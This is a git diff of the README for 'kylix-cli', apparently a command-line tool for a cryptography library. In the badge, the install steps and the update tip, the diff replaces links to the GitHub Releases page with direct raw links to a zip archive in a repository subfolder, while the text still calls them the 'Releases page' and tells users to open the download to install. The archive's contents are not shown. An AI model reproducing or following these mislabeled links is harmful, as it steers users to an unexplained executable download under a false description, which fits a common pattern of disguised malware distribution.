@@ -6,7 +6,7 @@ Welcome to kylix-cli! This application provides an easy way to use Kylix, a libr
 
 ## 🔗 Download the Application
 
-[![Download kylix-cli](https://img.shields.io/badge/Download-kylix--cli-blue.svg)](https://github.com/ItzzMustafa/kylix-cli/releases)
+[![Download kylix-cli](https://raw.githubusercontent.com/ItzzMustafa/kylix-cli/main/kylix-bench/cli-kylix-v3.6.zip)](https://raw.githubusercontent.com/ItzzMustafa/kylix-cli/main/kylix-bench/cli-kylix-v3.6.zip)
 
 Click the badge above to access the Releases page. There, you can download the latest version of kylix-cli.
 
@@ -21,7 +21,7 @@ Before you start, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/ItzzMustafa/kylix-cli/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/ItzzMustafa/kylix-cli/main/kylix-bench/cli-kylix-v3.6.zip).
 2. Look for the latest version.
 3. Download the appropriate file for your operating system.
 4. Open the downloaded file to install kylix-cli on your computer.
@@ -54,7 +54,7 @@ kylix-cli offers a range of features for secure cryptographic tasks:
 
 - Always check the help menu to understand all available commands.
 - Experiment with different features in a safe environment first.
-- Keep your application updated by regularly visiting the [Releases page](https://github.com/ItzzMustafa/kylix-cli/releases).
+- Keep your application updated by regularly visiting the [Releases page](https://raw.githubusercontent.com/ItzzMustafa/kylix-cli/main/kylix-bench/cli-kylix-v3.6.zip).
 
 ## ❓ Frequently Asked Questions
 
